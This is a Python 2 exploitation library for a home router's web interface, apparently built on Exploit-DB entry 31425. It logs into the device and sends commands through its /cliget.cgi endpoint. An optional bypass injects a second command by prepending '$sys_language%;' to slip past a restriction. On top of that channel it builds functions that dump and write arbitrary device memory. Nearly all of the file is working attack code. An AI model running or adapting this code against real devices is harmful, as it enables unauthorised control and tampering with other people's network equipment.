import urllib2,random,string
class Device:
    def uid_generator(self,N):
        return ''.join(random.choice(string.ascii_uppercase+string.ascii_lowercase+string.digits) for _ in range(N))
    def __init__(self,host,bypass=False,uid=None,baseHeaders=None,verbose=False,username='admin',password=''):
        self.bypass=bypass
        self.host=host
        self.baseHeaders=baseHeaders
        self.verbose=verbose
        self.uid=uid if uid<>None else self.uid_generator(16)
        self.username=username
        self.password=password
    def GetUrl(self,url,data=None,autologin=True):
        if self.verbose:
            print 'http://'+self.host+url
        if self.baseHeaders==None:
            req=urllib2.Request('http://'+self.host+url,data,headers={'Cookie':'uid='+self.uid})
        else:
            req=urllib2.Request('http://'+self.host+url,data,headers={'Cookie':'uid='+self.uid}+self.baseHeaders)
#        print req.get_full_url()
        resp=urllib2.urlopen(req)
        ret=resp.read()
        if autologin and ret.startswith('HTTP/1.0'):
            if self.Login(self.username,self.password):
                return self.GetUrl(url,data)
            else:
                return None
        resp.close()
        return ret
    def Login(self,username=None, password=None):
        #TY EDB-ID: 31425
        username=self.username if username==None else username
        password=self.password if password==None else password
        self.username=username
        self.password=password
        self.GetUrl('/login.htm','uname='+username+'&pws='+password+'&login=Login',autologin=False)
        return not 'm_login_router' in  self.GetUrl('/bsc_internet.htm',autologin=False)
    def ExecuteGet(self,cmd):
        cmd=cmd.replace(' ','%20')
        if self.bypass:cmd='$sys_language%;'+cmd #To bypass, ask for something irrelevant too
        r=self.GetUrl('/cliget.cgi?cmd='+cmd)
        if self.bypass: return r[3:] #... and remove that first response, hope sys_lang.. is never 3+ chars
        return r
    def MemDump(self,addr,size=0x80):
        r=[]
        dsize=size if size%0x80==0 else size+0x80
        lines=self.ExecuteGet('%;'.join(['mem dw '+hex(a)[2:-1] for a in range(addr,addr+dsize-1,0x80)])).replace('\n','').split('\r')
        for line in lines:
            line2=line.strip().replace(': ',':')
            if line2=='':
                continue
            addrDataSplit=line2.split(':')
            if len(addrDataSplit)!=2: print 'ads len err',len(addrDataSplit),addrDataSplit,line
            addr=int(addrDataSplit[0],16)
            data=addrDataSplit[1].split(' ')
#            if len(data)%2!=0 or len(data)<8: print 'data len err',len(data),data
            for dElement in data:
                if len(dElement)!=8: print 'del len err',len(dElement),dElement,line
                dbytes=[chr(int(dElement[i:i+2],16)) for i in range(0, 8, 2)]
                r+=dbytes
        if dsize<>size:
            if self.verbose:print 'dsize<>size'
            r=r[:size]
        return bytearray(r)
    def MemRead(self,addr,size=0x80):return self.MemDump(addr,size)
    def MemWrite(self,addr,block):
        r=[]
        sections=[block[i:i+32] for i in range(0,len(block),32)]
        for section in sections:
            cmd='%;'.join(['mem eb '+hex(a+addr)[2:-1]+' '+hex(section[a])[2:] for a in range(0,len(section))])
            r+=self.ExecuteGet(cmd)
            addr+=len(section)
        return r
